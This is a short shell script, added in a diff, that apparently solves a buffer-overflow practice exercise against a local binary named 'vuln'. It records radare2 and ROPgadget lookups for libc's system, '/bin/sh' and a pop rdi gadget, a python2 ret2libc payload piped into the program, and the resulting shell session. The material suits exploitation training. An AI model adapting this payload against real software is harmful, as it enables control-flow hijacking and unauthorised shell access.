@@ -1,0 +1,64 @@
+#!/bin/sh
+
+## non-executable stack so will have to jump to libc
+## first need to find address of system
+
+## r2 -d vuln
+
+## [0x7f8794b8d090]> dcu entry0
+## [0x00401050]> e search.in = dbg.maps
+## [0x00401050]> dmi libc system
+
+# nth  paddr      vaddr          bind type size lib name
+# ――――――――――――――――――――――――――――――――――――――――――――――――――――――
+# 1466 0x00049de0 0x7ffff7e12de0 WEAK FUNC 45       system
+
+
+## [0x00401050]> e search.from=0x7f3b383dede0
+
+# 0x7ffff7f54b62 hit3_0 .cempty == 1-c/bin/shexit 0MSGVERB.
+
+## now we have the two important addresses: system and "/bin/sh"
+## but still have to get the string in rdi
+ROPgadget --binary vuln | grep rdi # 0x0000000000401263 : pop rdi ; ret
+
+## so the addresses we need are:
+# POPRDI : 'c\x12@\x00\x00\x00\x00\x00'
+# BINSH  : 'bK\xf5\xf7\xff\x7f\x00\x00'
+# SYSTEM : '\xe0-\xe1\xf7\xff\x7f\x00\x00'
+
+python2 -c 'print("\x90"*120 +
+"c\x12@\x00\x00\x00\x00\x00" +
+"bK\xf5\xf7\xff\x7f\x00\x00" +
+"\xe0-\xe1\xf7\xff\x7f\x00\x00")' | ./vuln   # segmentation fault
+
+(python2 -c 'print("\x90"*120 +
+"c\x12@\x00\x00\x00\x00\x00" +
+"bK\xf5\xf7\xff\x7f\x00\x00" +
+"\xe0-\xe1\xf7\xff\x7f\x00\x00")'; cat) | ./vuln
+# ls
+# pattern  profile.rr2  sol  vuln
+# ps
+#     PID TTY          TIME CMD
+#    4088 pts/1    00:00:00 zsh
+#    7791 pts/1    00:00:00 cat
+#    7793 pts/1    00:00:00 vuln
+#    7794 pts/1    00:00:00 sh
+#    7823 pts/1    00:00:00 ps
+
+# done! :)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
